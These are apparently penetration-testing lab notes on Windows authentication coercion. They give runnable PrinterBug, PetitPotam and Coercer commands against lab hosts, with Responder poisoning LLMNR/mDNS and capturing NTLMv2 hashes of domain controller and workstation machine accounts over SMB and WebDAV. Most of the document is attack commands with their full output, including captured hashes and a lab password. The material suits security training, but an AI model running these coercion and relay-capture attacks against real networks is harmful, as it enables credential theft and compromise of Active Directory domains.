# Authentication Coercion

## Coercing SMB Authentication

### Enabling Responder SMB

```ini title="Responder.conf" linenums="10"
SMB      = On
```

### Responder (SMB)

```sh
htb-student@ubuntu:~$ sudo Responder.py -I ens192
```

### MS-RPRN [PrinterBug](https://github.com/dirkjanm/krbrelayx/blob/master/printerbug.py)

#### MS-RPRN Abuse

| TARGET | ATTACK MACHINE |
|---|---|
| 172.16.117.3 | 172.16.117.30 |

```sh
htb-student@ubuntu:~$ printerbug.py 'INLANEFREIGHT'/'plaintext$':'Password123!'@172.16.117.3 172.16.117.30
```

```output title="Output" hl_lines="4-5"
[*] Attempting to trigger authentication via rprn RPC at 172.16.117.3
[*] Bind OK
[*] Got handle
DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied
[*] Triggered RPC backconnect, this may or may not have worked
```

#### MS-RPRN Responder Results

```sh
htb-student@ubuntu:~$ sudo Responder.py -I ens192
```

```output title="Output"
[SMB] NTLMv2-SSP Client   : 172.16.117.3
[SMB] NTLMv2-SSP Username : INLANEFREIGHT\DC01$
[SMB] NTLMv2-SSP Hash     : DC01$::INLANEFREIGHT:2f86438e2ffd02ba:6C36B7A076FE94CB58650E00AA5688D9:0101000000000000008FE3A8FC73DB011AFE90C0A6B78EA70000000002000800390046005700570001001E00570049004E002D004C0046004B0030004A0050004A0056005A004500550004003400570049004E002D004C0046004B0030004A0050004A0056005A00450055002E0039004600570057002E004C004F00430041004C000300140039004600570057002E004C004F00430041004C000500140039004600570057002E004C004F00430041004C0007000800008FE3A8FC73DB0106000400020000000800300030000000000000000000000000400000E9A681B69B43E9A8DAB1F3C29FC40E7C1DFD1B05F4F093382165CA87530EE4C40A001000000000000000000000000000000000000900240063006900660073002F003100370032002E00310036002E003100310037002E00330030000000000000000000
```

### MS-EFSR [PetitPotam](https://github.com/topotam/PetitPotam)

#### MS-EFSR Abuse

| ATTACK MACHINE | TARGET |
|---|---|
| 172.16.117.30 | 172.16.117.3 |

```sh
htb-student@ubuntu:~$ PetitPotam.py 172.16.117.30 172.16.117.3 -u 'plaintext$' -p 'Password123!' -d INLANEFREIGHT.LOCAL
```

```output title="Output" hl_lines="10-11"
Trying pipe lsarpc
[-] Connecting to ncacn_np:172.16.117.3[\PIPE\lsarpc]
[+] Connected!
[+] Binding to c681d488-d850-11d0-8c52-00c04fd90f7e
[+] Successfully bound!
[-] Sending EfsRpcOpenFileRaw!
[-] Got RPC_ACCESS_DENIED!! EfsRpcOpenFileRaw is probably PATCHED!
[+] OK! Using unpatched function!
[-] Sending EfsRpcEncryptFileSrv!
[+] Got expected ERROR_BAD_NETPATH exception!!
[+] Attack worked!
```

#### MS-EFSR Responder Results

```sh
htb-student@ubuntu:~$ sudo Responder.py -I ens192
```

```output title="Output"
[SMB] NTLMv2-SSP Client   : 172.16.117.3
[SMB] NTLMv2-SSP Username : INLANEFREIGHT\DC01$
[SMB] NTLMv2-SSP Hash     : DC01$::INLANEFREIGHT:485e5b94a055fca0:88964526A121C98E9284139FA5FEA679:010100000000000000860948FF73DB01E99B0A5B4DC7823300000000020008004A0037004100440001001E00570049004E002D00570055005A0031004A0046004B0035004C005700470004003400570049004E002D00570055005A0031004A0046004B0035004C00570047002E004A003700410044002E004C004F00430041004C00030014004A003700410044002E004C004F00430041004C00050014004A003700410044002E004C004F00430041004C000700080000860948FF73DB0106000400020000000800300030000000000000000000000000400000E9A681B69B43E9A8DAB1F3C29FC40E7C1DFD1B05F4F093382165CA87530EE4C40A001000000000000000000000000000000000000900240063006900660073002F003100370032002E00310036002E003100310037002E00330030000000000000000000
```

### MS-DFSNM [Coercer](https://github.com/p0dalirius/Coercer)

#### MS-DFSNM Abuse

| TARGET | ATTACK MACHINE |
|---|---|
| 172.16.117.3 | 172.16.117.30 |

```sh
htb-student@ubuntu:~$ coercer coerce -t 172.16.117.3 -l 172.16.117.30 -u 'plaintext$' -p 'Password123!' -v --always-continue
```

```output title="Output" hl_lines="11"
[info] Starting coerce mode
[info] Scanning target 172.16.117.3
[+] Coercing '172.16.117.3' to authenticate to '172.16.117.30'
[!] SMB named pipe '\PIPE\Fssagentrpc' is not accessible!
[!] SMB named pipe '\PIPE\efsrpc' is not accessible!
[+] SMB named pipe '\PIPE\eventlog' is accessible!
   [+] Successful bind to interface (82273fdc-e32a-18c3-3f78-827929dc23ea, 0.0)!
      [!] (NO_AUTH_RECEIVED) MS-EVEN──>ElfrOpenBELW(BackupFileName='\??\UNC\172.16.117.30\FPpLVaP1\aa')
[+] SMB named pipe '\PIPE\lsarpc' is accessible!
   [+] Successful bind to interface (c681d488-d850-11d0-8c52-00c04fd90f7e, 1.0)!
      [+] (ERROR_BAD_NETPATH) MS-EFSR──>EfsRpcDecryptFileSrv(FileName='\\172.16.117.30\YUDT5fpf\file.txt\x00')
      [+] (ERROR_BAD_NETPATH) MS-EFSR──>EfsRpcDecryptFileSrv(FileName='\\172.16.117.30\G28jYm4E\\x00')
      [+] (ERROR_BAD_NETPATH) MS-EFSR──>EfsRpcDecryptFileSrv(FileName='\\172.16.117.30\mY8ywueS\x00')
      [+] (ERROR_BAD_NETPATH) MS-EFSR──>EfsRpcDecryptFileSrv(FileName='\\172.16.117.30@80/qdD\file.txt\x00')
      [+] (ERROR_BAD_NETPATH) MS-EFSR──>EfsRpcEncryptFileSrv(FileName='\\172.16.117.30\Ktp5hn2G\file.txt\x00')
      [+] (ERROR_BAD_NETPATH) MS-EFSR──>EfsRpcEncryptFileSrv(FileName='\\172.16.117.30\Rhh4vW3h\\x00')
      [+] (ERROR_BAD_NETPATH) MS-EFSR──>EfsRpcEncryptFileSrv(FileName='\\172.16.117.30\RGB3JuAS\x00')
      [+] (ERROR_BAD_NETPATH) MS-EFSR──>EfsRpcEncryptFileSrv(FileName='\\172.16.117.30@80/VDd\file.txt\x00')
      [+] (ERROR_BAD_NETPATH) MS-EFSR──>EfsRpcFileKeyInfo(FileName='\\172.16.117.30\5grPh2K6\file.txt\x00')
      [+] (ERROR_BAD_NETPATH) MS-EFSR──>EfsRpcFileKeyInfo(FileName='\\172.16.117.30\TT66gSpp\\x00')
      [+] (ERROR_BAD_NETPATH) MS-EFSR──>EfsRpcFileKeyInfo(FileName='\\172.16.117.30\2CBYJpgz\x00')
      [+] (ERROR_BAD_NETPATH) MS-EFSR──>EfsRpcFileKeyInfo(FileName='\\172.16.117.30@80/31P\file.txt\x00')
      [!] (RPC_S_ACCESS_DENIED) MS-EFSR──>EfsRpcOpenFileRaw(FileName='\\172.16.117.30\Dng6Nlul\file.txt\x00')
      [!] (RPC_S_ACCESS_DENIED) MS-EFSR──>EfsRpcOpenFileRaw(FileName='\\172.16.117.30\TvZZVdDR\\x00')
      [!] (RPC_S_ACCESS_DENIED) MS-EFSR──>EfsRpcOpenFileRaw(FileName='\\172.16.117.30\t74TiS0w\x00')
      [!] (RPC_S_ACCESS_DENIED) MS-EFSR──>EfsRpcOpenFileRaw(FileName='\\172.16.117.30@80/ESM\file.txt\x00')
      [+] (ERROR_BAD_NETPATH) MS-EFSR──>EfsRpcQueryRecoveryAgents(FileName='\\172.16.117.30\UdxshF54\file.txt\x00')
      [+] (ERROR_BAD_NETPATH) MS-EFSR──>EfsRpcQueryRecoveryAgents(FileName='\\172.16.117.30\VqliN3OD\\x00')
      [+] (ERROR_BAD_NETPATH) MS-EFSR──>EfsRpcQueryRecoveryAgents(FileName='\\172.16.117.30\zCmBXsSI\x00')
      [+] (ERROR_BAD_NETPATH) MS-EFSR──>EfsRpcQueryRecoveryAgents(FileName='\\172.16.117.30@80/GUk\file.txt\x00')
      [+] (ERROR_BAD_NETPATH) MS-EFSR──>EfsRpcQueryUsersOnFile(FileName='\\172.16.117.30\YzS891Mo\file.txt\x00')
      [+] (ERROR_BAD_NETPATH) MS-EFSR──>EfsRpcQueryUsersOnFile(FileName='\\172.16.117.30\GzMDLLTU\\x00')
      [+] (ERROR_BAD_NETPATH) MS-EFSR──>EfsRpcQueryUsersOnFile(FileName='\\172.16.117.30\UK5cCPlA\x00')
      [+] (ERROR_BAD_NETPATH) MS-EFSR──>EfsRpcQueryUsersOnFile(FileName='\\172.16.117.30@80/3XP\file.txt\x00')
[+] SMB named pipe '\PIPE\lsass' is accessible!
   [+] Successful bind to interface (c681d488-d850-11d0-8c52-00c04fd90f7e, 1.0)!
      [+] (ERROR_BAD_NETPATH) MS-EFSR──>EfsRpcDecryptFileSrv(FileName='\\172.16.117.30\yZCrhSQE\file.txt\x00')
      [+] (ERROR_BAD_NETPATH) MS-EFSR──>EfsRpcDecryptFileSrv(FileName='\\172.16.117.30\rcR8HtoI\\x00')
      [+] (ERROR_BAD_NETPATH) MS-EFSR──>EfsRpcDecryptFileSrv(FileName='\\172.16.117.30\N6Jqfzcn\x00')
      [+] (ERROR_BAD_NETPATH) MS-EFSR──>EfsRpcDecryptFileSrv(FileName='\\172.16.117.30@80/lkn\file.txt\x00')
      [+] (ERROR_BAD_NETPATH) MS-EFSR──>EfsRpcEncryptFileSrv(FileName='\\172.16.117.30\x6ChUeHx\file.txt\x00')
      [+] (ERROR_BAD_NETPATH) MS-EFSR──>EfsRpcEncryptFileSrv(FileName='\\172.16.117.30\SHZxgAqm\\x00')
      [+] (ERROR_BAD_NETPATH) MS-EFSR──>EfsRpcEncryptFileSrv(FileName='\\172.16.117.30\HNjh4k0j\x00')
      [+] (ERROR_BAD_NETPATH) MS-EFSR──>EfsRpcEncryptFileSrv(FileName='\\172.16.117.30@80/9TU\file.txt\x00')
      [+] (ERROR_BAD_NETPATH) MS-EFSR──>EfsRpcFileKeyInfo(FileName='\\172.16.117.30\wta1nX9v\file.txt\x00')
      [+] (ERROR_BAD_NETPATH) MS-EFSR──>EfsRpcFileKeyInfo(FileName='\\172.16.117.30\2oiqv11M\\x00')
      [+] (ERROR_BAD_NETPATH) MS-EFSR──>EfsRpcFileKeyInfo(FileName='\\172.16.117.30\unDVGMYc\x00')
      [+] (ERROR_BAD_NETPATH) MS-EFSR──>EfsRpcFileKeyInfo(FileName='\\172.16.117.30@80/v9H\file.txt\x00')
      [!] (RPC_S_ACCESS_DENIED) MS-EFSR──>EfsRpcOpenFileRaw(FileName='\\172.16.117.30\1VS1eY67\file.txt\x00')
      [!] (RPC_S_ACCESS_DENIED) MS-EFSR──>EfsRpcOpenFileRaw(FileName='\\172.16.117.30\gWeBDlbA\\x00')
      [!] (RPC_S_ACCESS_DENIED) MS-EFSR──>EfsRpcOpenFileRaw(FileName='\\172.16.117.30\zEZc1M8e\x00')
      [!] (RPC_S_ACCESS_DENIED) MS-EFSR──>EfsRpcOpenFileRaw(FileName='\\172.16.117.30@80/19v\file.txt\x00')
      [+] (ERROR_BAD_NETPATH) MS-EFSR──>EfsRpcQueryRecoveryAgents(FileName='\\172.16.117.30\sCCaJ6ez\file.txt\x00')
      [+] (ERROR_BAD_NETPATH) MS-EFSR──>EfsRpcQueryRecoveryAgents(FileName='\\172.16.117.30\LIPo2OeW\\x00')
      [+] (ERROR_BAD_NETPATH) MS-EFSR──>EfsRpcQueryRecoveryAgents(FileName='\\172.16.117.30\0m9YMKFu\x00')
      [+] (ERROR_BAD_NETPATH) MS-EFSR──>EfsRpcQueryRecoveryAgents(FileName='\\172.16.117.30@80/hi5\file.txt\x00')
      [+] (ERROR_BAD_NETPATH) MS-EFSR──>EfsRpcQueryUsersOnFile(FileName='\\172.16.117.30\l2Id629k\file.txt\x00')
      [+] (ERROR_BAD_NETPATH) MS-EFSR──>EfsRpcQueryUsersOnFile(FileName='\\172.16.117.30\GAzYlHmX\\x00')
      [+] (ERROR_BAD_NETPATH) MS-EFSR──>EfsRpcQueryUsersOnFile(FileName='\\172.16.117.30\Rh7VSAzV\x00')
      [+] (ERROR_BAD_NETPATH) MS-EFSR──>EfsRpcQueryUsersOnFile(FileName='\\172.16.117.30@80/2y1\file.txt\x00')
[+] SMB named pipe '\PIPE\netdfs' is accessible!
   [+] Successful bind to interface (4fc742e0-4a10-11cf-8273-00aa004ae673, 3.0)!
[+] SMB named pipe '\PIPE\netlogon' is accessible!
   [+] Successful bind to interface (c681d488-d850-11d0-8c52-00c04fd90f7e, 1.0)!
      [+] (ERROR_BAD_NETPATH) MS-EFSR──>EfsRpcDecryptFileSrv(FileName='\\172.16.117.30\GI680w6P\file.txt\x00')
      [+] (ERROR_BAD_NETPATH) MS-EFSR──>EfsRpcDecryptFileSrv(FileName='\\172.16.117.30\oqnbOWoL\\x00')
      [+] (ERROR_BAD_NETPATH) MS-EFSR──>EfsRpcDecryptFileSrv(FileName='\\172.16.117.30\qA0YimAf\x00')
      [+] (ERROR_BAD_NETPATH) MS-EFSR──>EfsRpcDecryptFileSrv(FileName='\\172.16.117.30@80/icc\file.txt\x00')
      [+] (ERROR_BAD_NETPATH) MS-EFSR──>EfsRpcEncryptFileSrv(FileName='\\172.16.117.30\OkEqSdjG\file.txt\x00')
      [+] (ERROR_BAD_NETPATH) MS-EFSR──>EfsRpcEncryptFileSrv(FileName='\\172.16.117.30\3qR2bNBv\\x00')
      [+] (ERROR_BAD_NETPATH) MS-EFSR──>EfsRpcEncryptFileSrv(FileName='\\172.16.117.30\3ZwPel7k\x00')
      [+] (ERROR_BAD_NETPATH) MS-EFSR──>EfsRpcEncryptFileSrv(FileName='\\172.16.117.30@80/EO9\file.txt\x00')
      [+] (ERROR_BAD_NETPATH) MS-EFSR──>EfsRpcFileKeyInfo(FileName='\\172.16.117.30\dgJUJlzz\file.txt\x00')
      [+] (ERROR_BAD_NETPATH) MS-EFSR──>EfsRpcFileKeyInfo(FileName='\\172.16.117.30\bw3nXk4N\\x00')
      [+] (ERROR_BAD_NETPATH) MS-EFSR──>EfsRpcFileKeyInfo(FileName='\\172.16.117.30\M5Gqr2dm\x00')
      [+] (ERROR_BAD_NETPATH) MS-EFSR──>EfsRpcFileKeyInfo(FileName='\\172.16.117.30@80/Zpy\file.txt\x00')
      [!] (RPC_S_ACCESS_DENIED) MS-EFSR──>EfsRpcOpenFileRaw(FileName='\\172.16.117.30\npyU3RVs\file.txt\x00')
      [!] (RPC_S_ACCESS_DENIED) MS-EFSR──>EfsRpcOpenFileRaw(FileName='\\172.16.117.30\kFtRib9b\\x00')
      [!] (RPC_S_ACCESS_DENIED) MS-EFSR──>EfsRpcOpenFileRaw(FileName='\\172.16.117.30\FJ7W7NjL\x00')
      [!] (RPC_S_ACCESS_DENIED) MS-EFSR──>EfsRpcOpenFileRaw(FileName='\\172.16.117.30@80/ZPW\file.txt\x00')
      [+] (ERROR_BAD_NETPATH) MS-EFSR──>EfsRpcQueryRecoveryAgents(FileName='\\172.16.117.30\2fhWDbFQ\file.txt\x00')
      [+] (ERROR_BAD_NETPATH) MS-EFSR──>EfsRpcQueryRecoveryAgents(FileName='\\172.16.117.30\VgHjaS0V\\x00')
      [+] (ERROR_BAD_NETPATH) MS-EFSR──>EfsRpcQueryRecoveryAgents(FileName='\\172.16.117.30\qFPxbiNp\x00')
      [+] (ERROR_BAD_NETPATH) MS-EFSR──>EfsRpcQueryRecoveryAgents(FileName='\\172.16.117.30@80/Ka0\file.txt\x00')
      [+] (ERROR_BAD_NETPATH) MS-EFSR──>EfsRpcQueryUsersOnFile(FileName='\\172.16.117.30\S2JD2dwN\file.txt\x00')
      [+] (ERROR_BAD_NETPATH) MS-EFSR──>EfsRpcQueryUsersOnFile(FileName='\\172.16.117.30\4Sv8VZGL\\x00')
      [+] (ERROR_BAD_NETPATH) MS-EFSR──>EfsRpcQueryUsersOnFile(FileName='\\172.16.117.30\PiZglu6U\x00')
      [+] (ERROR_BAD_NETPATH) MS-EFSR──>EfsRpcQueryUsersOnFile(FileName='\\172.16.117.30@80/NEO\file.txt\x00')
[+] SMB named pipe '\PIPE\samr' is accessible!
   [+] Successful bind to interface (c681d488-d850-11d0-8c52-00c04fd90f7e, 1.0)!
      [+] (ERROR_BAD_NETPATH) MS-EFSR──>EfsRpcDecryptFileSrv(FileName='\\172.16.117.30\bFlK5EkF\file.txt\x00')
      [+] (ERROR_BAD_NETPATH) MS-EFSR──>EfsRpcDecryptFileSrv(FileName='\\172.16.117.30\tjxFV0t4\\x00')
      [+] (ERROR_BAD_NETPATH) MS-EFSR──>EfsRpcDecryptFileSrv(FileName='\\172.16.117.30\2QXnAXdo\x00')
      [+] (ERROR_BAD_NETPATH) MS-EFSR──>EfsRpcDecryptFileSrv(FileName='\\172.16.117.30@80/rfX\file.txt\x00')
      [+] (ERROR_BAD_NETPATH) MS-EFSR──>EfsRpcEncryptFileSrv(FileName='\\172.16.117.30\VkpiQ1sP\file.txt\x00')
      [+] (ERROR_BAD_NETPATH) MS-EFSR──>EfsRpcEncryptFileSrv(FileName='\\172.16.117.30\uaOLvQuZ\\x00')
      [+] (ERROR_BAD_NETPATH) MS-EFSR──>EfsRpcEncryptFileSrv(FileName='\\172.16.117.30\fwCXHpOs\x00')
      [+] (ERROR_BAD_NETPATH) MS-EFSR──>EfsRpcEncryptFileSrv(FileName='\\172.16.117.30@80/rF6\file.txt\x00')
      [+] (ERROR_BAD_NETPATH) MS-EFSR──>EfsRpcFileKeyInfo(FileName='\\172.16.117.30\aeJoC344\file.txt\x00')
      [+] (ERROR_BAD_NETPATH) MS-EFSR──>EfsRpcFileKeyInfo(FileName='\\172.16.117.30\ELKd5Qcl\\x00')
      [+] (ERROR_BAD_NETPATH) MS-EFSR──>EfsRpcFileKeyInfo(FileName='\\172.16.117.30\4nnMjLgC\x00')
      [+] (ERROR_BAD_NETPATH) MS-EFSR──>EfsRpcFileKeyInfo(FileName='\\172.16.117.30@80/blu\file.txt\x00')
      [!] (RPC_S_ACCESS_DENIED) MS-EFSR──>EfsRpcOpenFileRaw(FileName='\\172.16.117.30\wGy2CeCn\file.txt\x00')
      [!] (RPC_S_ACCESS_DENIED) MS-EFSR──>EfsRpcOpenFileRaw(FileName='\\172.16.117.30\sotbfc6x\\x00')
      [!] (RPC_S_ACCESS_DENIED) MS-EFSR──>EfsRpcOpenFileRaw(FileName='\\172.16.117.30\TTaRiL0J\x00')
      [!] (RPC_S_ACCESS_DENIED) MS-EFSR──>EfsRpcOpenFileRaw(FileName='\\172.16.117.30@80/GMt\file.txt\x00')
      [+] (ERROR_BAD_NETPATH) MS-EFSR──>EfsRpcQueryRecoveryAgents(FileName='\\172.16.117.30\hHkj3Rk8\file.txt\x00')
      [+] (ERROR_BAD_NETPATH) MS-EFSR──>EfsRpcQueryRecoveryAgents(FileName='\\172.16.117.30\DDhXdgYm\\x00')
      [+] (ERROR_BAD_NETPATH) MS-EFSR──>EfsRpcQueryRecoveryAgents(FileName='\\172.16.117.30\nvscmwYz\x00')
      [+] (ERROR_BAD_NETPATH) MS-EFSR──>EfsRpcQueryRecoveryAgents(FileName='\\172.16.117.30@80/yPf\file.txt\x00')
      [+] (ERROR_BAD_NETPATH) MS-EFSR──>EfsRpcQueryUsersOnFile(FileName='\\172.16.117.30\KbcGxjrH\file.txt\x00')
      [+] (ERROR_BAD_NETPATH) MS-EFSR──>EfsRpcQueryUsersOnFile(FileName='\\172.16.117.30\UIIkjfWn\\x00')
      [+] (ERROR_BAD_NETPATH) MS-EFSR──>EfsRpcQueryUsersOnFile(FileName='\\172.16.117.30\GyZwva8t\x00')
      [+] (ERROR_BAD_NETPATH) MS-EFSR──>EfsRpcQueryUsersOnFile(FileName='\\172.16.117.30@80/cPD\file.txt\x00')
[+] SMB named pipe '\PIPE\spoolss' is accessible!
   [+] Successful bind to interface (12345678-1234-abcd-ef00-0123456789ab, 1.0)!
[+] All done! Bye Bye!
```

#### MS-DFSNM Responder Results

```sh
htb-student@ubuntu:~$ sudo Responder.py -I ens192
```

```output title="Output"
[SMB] NTLMv2-SSP Client   : 172.16.117.3
[SMB] NTLMv2-SSP Username : INLANEFREIGHT\DC01$
[SMB] NTLMv2-SSP Hash     : DC01$::INLANEFREIGHT:9db87988a6b4ef2d:E23FA1263225841DBBB1539B75602724:010100000000000080FE49130074DB01FBF0911DCB5E8FDD0000000002000800330042003300570001001E00570049004E002D00490047004C00310031004C004800480032004900500004003400570049004E002D00490047004C00310031004C00480048003200490050002E0033004200330057002E004C004F00430041004C000300140033004200330057002E004C004F00430041004C000500140033004200330057002E004C004F00430041004C000700080080FE49130074DB0106000400020000000800300030000000000000000000000000400000E9A681B69B43E9A8DAB1F3C29FC40E7C1DFD1B05F4F093382165CA87530EE4C40A001000000000000000000000000000000000000900240063006900660073002F003100370032002E00310036002E003100310037002E00330030000000000000000000
```

## Coercing HTTP Authentication

### Enabling Responder HTTP

```ini title="Responder.conf" linenums="17"
HTTP     = On
```

### Responder (HTTP)

```sh
htb-student@ubuntu:~$ sudo Responder.py -I ens192
```

### PrinterBug

#### PrinterBug Abuse

| TARGET | WEBDAV CONNECTION STRING |
|---|---|
| 172.16.117.50 | gibberish@80/test |

```sh
htb-student@ubuntu:~$ printerbug.py 'INLANEFREIGHT'/'plaintext$':'Password123!'@172.16.117.50 gibberish@80/test
```

```output title="Output" hl_lines="4-5"
[*] Attempting to trigger authentication via rprn RPC at 172.16.117.50
[*] Bind OK
[*] Got handle
RPRN SessionError: code: 0x6ba - RPC_S_SERVER_UNAVAILABLE - The RPC server is unavailable.
[*] Triggered RPC backconnect, this may or may not have worked
```

#### PrinterBug Responder Results

```sh
htb-student@ubuntu:~$ sudo Responder.py -I ens192
```

```output title="Output" hl_lines="1-2"
[*] [MDNS] Poisoned answer sent to 172.16.117.50   for name gibberish.local
[*] [LLMNR]  Poisoned answer sent to 172.16.117.50 for name gibberish
[WebDAV] NTLMv2 Client   : 172.16.117.50
[WebDAV] NTLMv2 Username : INLANEFREIGHT\WS01$
[WebDAV] NTLMv2 Hash     : WS01$::INLANEFREIGHT:891351c397436b4a:005C6232CD5FEF1DCC5C3AF98E546D11:0101000000000000273EB0F00174DB018C5E7662BF9EF14F0000000002000800560055004C00470001001E00570049004E002D0046005A004C00420037005A005600470051003700380004001400560055004C0047002E004C004F00430041004C0003003400570049004E002D0046005A004C00420037005A00560047005100370038002E00560055004C0047002E004C004F00430041004C0005001400560055004C0047002E004C004F00430041004C000800300030000000000000000000000000400000A14D3C2BF2D2023DD2BFBE0E7C4AC1D6A49A78BE7EEDBAA6F7856889555BCC310A001000000000000000000000000000000000000900280048005400540050002F006700690062006200650072006900730068002E006C006F00630061006C000000000000000000
```

### PetitPotam

#### PetitPotam Abuse

| WEBDAV CONNECTION STRING | TARGET |
|---|---|
| gibberish@80/test | 172.16.117.50 |

```sh
htb-student@ubuntu:~$ PetitPotam.py gibberish@80/test 172.16.117.50 -u 'plaintext$' -p 'Password123!'
```

```output title="Output" hl_lines="10-11"
Trying pipe lsarpc
[-] Connecting to ncacn_np:172.16.117.50[\PIPE\lsarpc]
[+] Connected!
[+] Binding to c681d488-d850-11d0-8c52-00c04fd90f7e
[+] Successfully bound!
[-] Sending EfsRpcOpenFileRaw!
[-] Got RPC_ACCESS_DENIED!! EfsRpcOpenFileRaw is probably PATCHED!
[+] OK! Using unpatched function!
[-] Sending EfsRpcEncryptFileSrv!
[+] Got expected ERROR_BAD_NETPATH exception!!
[+] Attack worked!
```

#### PetitPotam Responder Results

```sh
htb-student@ubuntu:~$ sudo Responder.py -I ens192
```

```output title="Output" hl_lines="1-2"
[*] [MDNS] Poisoned answer sent to 172.16.117.50   for name gibberish.local
[*] [LLMNR]  Poisoned answer sent to 172.16.117.50 for name gibberish
[WebDAV] NTLMv2 Client   : 172.16.117.50
[WebDAV] NTLMv2 Username : INLANEFREIGHT\WS01$
[WebDAV] NTLMv2 Hash     : WS01$::INLANEFREIGHT:de4b68d6b4c1c5a4:62B1AC6D64F36E349D35F91BE5C51BC5:01010000000000002DF2DC410274DB01DC881BDF31F3BC3400000000020008005A004C005600460001001E00570049004E002D005A0048003200590056004100450031005A004D003200040014005A004C00560046002E004C004F00430041004C0003003400570049004E002D005A0048003200590056004100450031005A004D0032002E005A004C00560046002E004C004F00430041004C00050014005A004C00560046002E004C004F00430041004C000800300030000000000000000000000000400000A14D3C2BF2D2023DD2BFBE0E7C4AC1D6A49A78BE7EEDBAA6F7856889555BCC310A001000000000000000000000000000000000000900280048005400540050002F006700690062006200650072006900730068002E006C006F00630061006C000000000000000000
```

### Coercer [1.6](https://github.com/p0dalirius/Coercer/releases/tag/1.6)

#### Coercer 1.6 Abuse

| TARGET | ATTACK MACHINE NAME |
|---|---|
| 172.16.117.50 | gibberish |

```sh
htb-student@ubuntu:~$ Coercer.py -t 172.16.117.50 -wh gibberish -wp 80 -u 'plaintext$' -p 'Password123!' -v
```

```output title="Output" hl_lines="16-20"
[debug] Detected 5 usable pipes in implemented protocols.
[172.16.117.50] Analyzing available protocols on the remote machine and perform RPC calls to coerce authentication to None ...
         [>] Connecting to ncacn_np:172.16.117.50[\PIPE\Fssagentrpc] ... fail
      [!] Something went wrong, check error status => SMB SessionError: STATUS_OBJECT_NAME_NOT_FOUND(The object name is not found.)
   [>] Pipe '\PIPE\Fssagentrpc' is not accessible!
         [>] Connecting to ncacn_np:172.16.117.50[\PIPE\efsrpc] ... fail
      [!] Something went wrong, check error status => SMB SessionError: STATUS_OBJECT_NAME_NOT_FOUND(The object name is not found.)
   [>] Pipe '\PIPE\efsrpc' is not accessible!
         [>] Connecting to ncacn_np:172.16.117.50[\PIPE\lsarpc] ... success
   [>] Pipe '\PIPE\lsarpc' is accessible!
         [>] Connecting to ncacn_np:172.16.117.50[\PIPE\lsarpc] ... success
         [>] Binding to <uuid='c681d488-d850-11d0-8c52-00c04fd90f7e', version='1.0'> ... success
         [>] Connecting to ncacn_np:172.16.117.50[\PIPE\lsarpc] ... success
         [>] Binding to <uuid='c681d488-d850-11d0-8c52-00c04fd90f7e', version='1.0'> ... success
      [>] On '172.16.117.50' through '\PIPE\lsarpc' targeting 'MS-EFSR::EfsRpcOpenFileRaw' (opnum 0) ... rpc_s_access_denied
      [>] On '172.16.117.50' through '\PIPE\lsarpc' targeting 'MS-EFSR::EfsRpcEncryptFileSrv' (opnum 4) ... ERROR_BAD_NETPATH (Attack has worked!)
      [>] On '172.16.117.50' through '\PIPE\lsarpc' targeting 'MS-EFSR::EfsRpcDecryptFileSrv' (opnum 5) ... ERROR_BAD_NETPATH (Attack has worked!)
      [>] On '172.16.117.50' through '\PIPE\lsarpc' targeting 'MS-EFSR::EfsRpcQueryUsersOnFile' (opnum 6) ... ERROR_BAD_NETPATH (Attack has worked!)
      [>] On '172.16.117.50' through '\PIPE\lsarpc' targeting 'MS-EFSR::EfsRpcQueryRecoveryAgents' (opnum 7) ... ERROR_BAD_NETPATH (Attack has worked!)
      [>] On '172.16.117.50' through '\PIPE\lsarpc' targeting 'MS-EFSR::EfsRpcEncryptFileSrv' (opnum 12) ... ERROR_BAD_NETPATH (Attack has worked!)
         [>] Connecting to ncacn_np:172.16.117.50[\PIPE\netdfs] ... fail
      [!] Something went wrong, check error status => SMB SessionError: STATUS_OBJECT_NAME_NOT_FOUND(The object name is not found.)
   [>] Pipe '\PIPE\netdfs' is not accessible!
         [>] Connecting to ncacn_np:172.16.117.50[\PIPE\spoolss] ... success
   [>] Pipe '\PIPE\spoolss' is accessible!
         [>] Connecting to ncacn_np:172.16.117.50[\PIPE\spoolss] ... success
         [>] Binding to <uuid='12345678-1234-ABCD-EF00-0123456789AB', version='1.0'> ... success
         [>] Connecting to ncacn_np:172.16.117.50[\PIPE\spoolss] ... success
         [>] Binding to <uuid='12345678-1234-ABCD-EF00-0123456789AB', version='1.0'> ... success

[+] All done!
```

#### Coercer 1.6 Responder Results

```sh
htb-student@ubuntu:~$ sudo Responder.py -I ens192
```

```output title="Output" hl_lines="1-2"
[*] [MDNS] Poisoned answer sent to 172.16.117.50   for name gibberish.local
[*] [LLMNR]  Poisoned answer sent to 172.16.117.50 for name gibberish
[WebDAV] NTLMv2 Client   : 172.16.117.50
[WebDAV] NTLMv2 Username : INLANEFREIGHT\WS01$
[WebDAV] NTLMv2 Hash     : WS01$::INLANEFREIGHT:1112b850f81df819:758122328EED019D01628BDE3AF257B2:0101000000000000D8C1D3B90274DB0113B77F7AD7B79C930000000002000800410055005100550001001E00570049004E002D0052003800460036004B00470031004A004500520047000400140041005500510055002E004C004F00430041004C0003003400570049004E002D0052003800460036004B00470031004A004500520047002E0041005500510055002E004C004F00430041004C000500140041005500510055002E004C004F00430041004C000800300030000000000000000000000000400000A14D3C2BF2D2023DD2BFBE0E7C4AC1D6A49A78BE7EEDBAA6F7856889555BCC310A001000000000000000000000000000000000000900280048005400540050002F006700690062006200650072006900730068002E006C006F00630061006C000000000000000000
```

## Windows Coerced Authentication Methods

### Methods

| PROTOCOL | FUNCTION NAME | POC |
|---|---|---|
| MS-DFSNM | [NetrDfsAddStdRoot](https://github.com/p0dalirius/windows-coerced-authentication-methods/tree/master/methods/MS-DFSNM%20-%20Distributed%20File%20System%20(DFS)%20Namespace%20Management%20Protocol/12.%20Remote%20call%20to%20NetrDfsAddStdRoot%20(opnum%2012)) | [coerce_poc.py](https://github.com/p0dalirius/windows-coerced-authentication-methods/blob/master/methods/MS-DFSNM%20-%20Distributed%20File%20System%20(DFS)%20Namespace%20Management%20Protocol/12.%20Remote%20call%20to%20NetrDfsAddStdRoot%20(opnum%2012)/coerce_poc.py) |
